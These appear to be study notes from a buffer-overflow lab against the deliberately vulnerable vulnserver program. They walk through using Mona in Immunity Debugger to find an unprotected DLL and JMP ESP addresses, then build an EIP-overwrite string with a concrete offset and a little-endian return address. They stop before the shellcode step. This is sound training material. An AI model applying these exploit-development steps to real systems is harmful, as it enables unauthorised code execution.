
# When we say we are finding right module, we mean we need to inspect program's dll files to find a dll without memory protections like Rebase, SafeSEH, ASLR, CFG etc

# No Memory protections means no 

# There is a tool called `Mona` which we can use for this
https://github.com/corelan/mona

Paste `Mona.py` in C:/Program Files(x86)/immunity Inc/Immunity Debugger/PyCommands

# Now got Immunity Debugger and type mona modules in bottom input field 

# `"!mona modules"`

We can see below output

-----------------------------------
0BADF00D    Module info :
0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------
0BADF00D    Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, Modulename & Path, DLLCharacteristics
0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------
0BADF00D    0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False | False |  False   | False  | -1.0- [essfunc.dll] (C:\Users\DoshiJi\Desktop\vulnserver-master\essfunc.dll) 0x0
0BADF00D    0x76c50000 | 0x76e8a000 | 0x0023a000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.2788 [KERNELBASE.dll] (C:\Windows\System32\KERNELBASE.dll) 0x4140
0BADF00D    0x6d9c0000 | 0x6da12000 | 0x00052000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.1 [mswsock.dll] (C:\Windows\system32\mswsock.dll) 0x4140
0BADF00D    0x747b0000 | 0x74850000 | 0x000a0000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.1 [apphelp.dll] (C:\Windows\SYSTEM32\apphelp.dll) 0x4140
0BADF00D    0x00400000 | 0x00407000 | 0x00007000 | False  | False   | False | False |  False   | False  | -1.0- [vulnserver.exe] (C:\Users\DoshiJi\Desktop\vulnserver-master\vulnserver.exe) 0x0
0BADF00D    0x764a0000 | 0x76590000 | 0x000f0000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.2788 [KERNEL32.DLL] (C:\Windows\System32\KERNEL32.DLL) 0x4140
0BADF00D    0x759d0000 | 0x75a8f000 | 0x000bf000 | True   | True    | True  | True  |  False   | True   | 7.0.19041.546 [msvcrt.dll] (C:\Windows\System32\msvcrt.dll) 0x4140
0BADF00D    0x77280000 | 0x77424000 | 0x001a4000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.2788 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll) 0x4140
0BADF00D    0x771b0000 | 0x7726f000 | 0x000bf000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.2788 [RPCRT4.dll] (C:\Windows\System32\RPCRT4.dll) 0x4140
0BADF00D    0x75760000 | 0x757c3000 | 0x00063000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.1081 [WS2_32.DLL] (C:\Windows\System32\WS2_32.DLL) 0x4140
0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------


# We can note the `essfunc.dll` which is part of vulnserver and has all protections as False

# Now we need to find `opcode equivalent` of `JMP ESP` command 

`JMP ESP `- 
this comand is in Assembly Language and it means `"Jump to the stack pointer"`, Its called `Jump command`

# when we say we are looking for opcode equivalent we are trying to convert Assembly language into hex code

# To find opcode equivalent we will use `nasm_shell`
                                      
┌──(kali㉿kali)-[/]
└─$ `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`
nasm > JMP ESP
00000000  FFE4              jmp esp
nasm > 

# So the Hex code equivalent for JMP ESP is `FFE4`

# So now we will type at the bottom input in Immunity Debugger

`!mona find -s "\xffe4" -m essfunc.dll `

# Hit enter and we get below output

0BADF00D   [+] Results :
625011AF     0x625011af : "\xffe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\DoshiJi\Desktop\vulnserver-master\essfunc.dll), 0x0
625011BB     0x625011bb : "\xffe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\DoshiJi\Desktop\vulnserver-master\essfunc.dll), 0x0
625011C7     0x625011c7 : "\xffe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\DoshiJi\Desktop\vulnserver-master\essfunc.dll), 0x0
625011D3     0x625011d3 : "\xffe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\DoshiJi\Desktop\vulnserver-master\essfunc.dll), 0x0
625011DF     0x625011df : "\xffe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\DoshiJi\Desktop\vulnserver-master\essfunc.dll), 0x0
625011EB     0x625011eb : "\xffe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\DoshiJi\Desktop\vulnserver-master\essfunc.dll), 0x0
625011F7     0x625011f7 : "\xffe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\DoshiJi\Desktop\vulnserver-master\essfunc.dll), 0x0
62501203     0x62501203 : "\xffe4" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\DoshiJi\Desktop\vulnserver-master\essfunc.dll), 0x0
62501205     0x62501205 : "\xffe4" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\DoshiJi\Desktop\vulnserver-master\essfunc.dll), 0x0
0BADF00D       Found a total of 9 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.875000

# So We got the Return Adresses, for example here `625011AF` is return address  and we see for all these return addresses memeory protections are False

# Now We will be using this return address at the place where where we used 'B' to determine if were able to write to EIP

We will Replace

`shellcode = "A" * 2003 + "B" *4`

by

`shellcode = "A" * 2003 + "\xaf\x11\x50\x62"`

(Check Fuzz5.py)

# Note we put this in reverse `625011AF` --> `\xaf\x11\x50\x62"`,  this is because we are considering x86 architecture and x86 architecure stores low order byte at the lowest address and high order byte at highest address , so we put it in reverse

# Now let generate our shellcode payload
